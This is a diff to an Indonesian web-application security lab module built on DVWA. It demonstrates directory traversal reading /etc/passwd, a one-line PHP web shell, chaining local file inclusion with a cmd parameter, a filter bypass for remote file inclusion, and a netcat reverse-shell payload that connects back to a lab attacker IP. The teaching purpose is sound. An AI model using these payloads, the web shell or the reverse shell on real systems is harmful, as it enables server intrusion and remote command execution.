@@ -395,7 +395,45 @@ Menurut anda, apa yang akan anda lakukan sebagai penyerang untuk dapat mengakses
 
 - Identifikasi request parameter yang dapat dimanipulasi
 - Lakukan percobaan dengan memasukkan payload supaya website memuat informasi yang tidak seharusnya bisa diakses
+- Lihat error
 
+### Contoh serangan Directory Traversal
+
+Input yang tidak tersanitasi dan cara menampilkan file dengan cara yang kurang baik dapat menyebabkan munculnya kelemahan Directory Traversal, sebagai contoh pada kasus di DVWA berikut
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/d4f19259-df66-43a7-9bf2-260c7c998dc1)
+
+bila kita lihat dari kode sumbernya:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/f6579729-d985-40dc-af9d-698727981c5c)
+
+Input parameter 'page' dari user tidak disanitasi dengan baik, sehingga apabila kita memasukkan input seperti:
+
+```
+../../../../../etc/passwd
+```
+
+Akan menampilkan file seperti berikut:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/e84cfee8-e662-43b0-b9b6-86db265d1672)
+
+File tersebut menampilkan siapa saja user yang beroperasi dalam sistem, terlihat tidak terlalu berbahaya bukan? Bagaimana apabila kasusnya kita ganti menjadi seperti ini:
+
+- Bapak / Ibu menyimpan file berupa catatan pribadi perusahaan atau informasi rahasia seperti pada sebuah file email_pass.txt di server seperti berikut:
+
+```
+user                 pass
+admin@gmail.com   Djum4nt0sup3r
+```
+
+- Apabila hacker bisa menemukan lokasi dari file tersebut dan menggunakan cara diatas
+
+```
+/var/www/dvwa/email_pass.txt
+```
+Haislnya bisa seperti berikut:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/a035e986-6ce1-407e-9c76-31682e64db00)
 ## File Inclusion Vulnerabilities
 
 ### Deskripsi
@@ -459,7 +497,14 @@ Mirip dengan Local File Inclusion, bedanya Remote File Inclusion berarti penyera
 
 
 ### Demo Kerentanan File Inclusion
-- Buka DVWA
+Pada kasus ini, anggap seorang hacker telah berhasil memasukkan file berbahaya kedalam sistem, baik melalui fitur dalam website atau menggunakan cara lain. Scriptt yang dimasukkan oleh si hacker merupakan file bernama **malscript.php** yang berisi kode berikut:
+
+```php
+<?php system($_GET['cmd']);?>
+```
+Kode ini akan melakukan perintah server sesuai dengan masukan yang diberikan pada parameter cmd, berikut step by stepnya:
+
+- Buka DVWA 
 - Pilih section file inclusion
 
    <!-- FILE INCLUSION SECTION IN DVWA IMAGE --!>
@@ -467,25 +512,93 @@ Mirip dengan Local File Inclusion, bedanya Remote File Inclusion berarti penyera
 - Terdapat 3 opsi file yang ketika ditekan akan menampilkan isi dari file tersebut
 - Pilih salah satu, dan anda bisa melihat bahwa nama dari file akan muncul di request parameter
 ```
-http://localhost:4312/vulnerabilities/fi/?page=file1.php
+http://ip_mesin:4312/vulnerabilities/fi/?page=file1.php
 ```
 
 #### LOCAL FILE INCLUSION PAYLOAD
-- Masukkan payload berikut sebagai value dari pada parameter **?page=**
+- Dengan memanfaatkan kelemahan Directory traversal, masukkan payload berikut sebagai value dari pada parameter **?page=**
 ```
-../../../../../etc/passwd
+../../../../../var/www/dvwa/malscript.php
+```
+dan tambahkan paramter cmd disebelahnya seperti berikut:
+```
+&cmd=ls
 ```
 Sehingga pada url menajdi seperti berikut
 ```
-?page=../../../../../etc/passwd
+?page=../../../../../var/www/dvwa/malscript.php&cmd=ls
 ```
 - Klik enter
 - Maka konten dari file akan muncul seperti di bawah
 
-    <!-- IMAGE FILE INCLUSION !-->
-
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/0b967496-98d7-49fb-a60c-8ef16f59c1e0)
 
 #### REMOTE FILE INCLUSION PAYLOAD
+
+Mirip dengan Local File Inclusion, pada **Remote File Inclusion (RFI)**, file yang ada berasal dari luar server, alias berasal dari server penyerang. Untuk mengetahui apakah RFI bisa terjadi, mirip seperti dengan Local File Inclusion.
+Sebagai percobaan, ganti value pada parameter **?page=**, menjadi http://google.com atau http://imdb.com, maka berikut hasil yang akan ditampilkan:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/3e759721-0604-44bd-b48a-b3774d33699a)
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/672f8a0c-3497-4192-af7a-ab6e272dda5e)
+
+####  Untuk level Medium
+Sekarang, ganti level ke level medium dengan cara:
+- Masuk ke section DVWA Security
+- Lalu ganti kesulitan menjadi medium dan klik submit
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/ddc9c0b4-782d-4031-a7f4-4a69e46fee54)
+
+- Kembali ke section File Inclusion
+- Klik **View Source**
+- Berikut merupakan contoh upgrade securitynya
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/7591d17e-c849-4365-8ca0-a2cb7226509f)
+
+Cara ini masih bisa diBypass dengan cara mengganti **http://**, menjadi hthttp://tp://. Berikut pembuktiannya:
+
+- Ketika menggunakan http://google.com biasa
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/ad98e0a2-b0b9-4d5e-a844-5d8b81f06708)
+
+- Ketika menggunakan cara lain seperti hthttp://tp://google.com
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/6cd799cc-83f4-4dab-8133-7a008b658109)
+
+- Keamanan berhasil dibypass
+
+
+#### Contoh kejadian dimana penyerang bisa masuk ke dalam server.
+Berikut saya memiliki 2 buah IP:
+
+IP server 192.168.111.129
+IP penyerang 192.168.111.128
+
+Berikut contoh isi file dalam server:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/227d206d-594c-4e72-b2bc-299207b72870)
+
+Dalam server penyerang, telah disiapkan file bernama info.txt untuk masuk kedalam server seperti berikut:
+
+```php
+<?php system('nc 192.168.111.128 1234 -e /bin/bash');?>
+```
+Kode ini memiliki fungsi untuk membuka koneksi dari server ke server penyerang, memberikan akses server kepada penyerang di port 1234.
+
+Penyerang saat ini sedang menunggu koneksi di port 1234
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/41d6c3d1-c9cc-462b-8bf3-8feb1d1366e1)
+
+Ketika server memiliki kelemahan File Inclusion, penyerang dapat memasukkan alamat dan file dari penyerang seperti berikut:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/44e5cd47-ada2-445f-bd1a-54e0072bfe32)
+
+Hasilnya seperti berikut:
+
+![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/36f463f8-f00a-4877-b6bb-fca035801deb)
+
+Penyerang berhasil masuk ke dalam server.
+
 
 ### Cara Mencegah Kerentanan File Inclusion
 
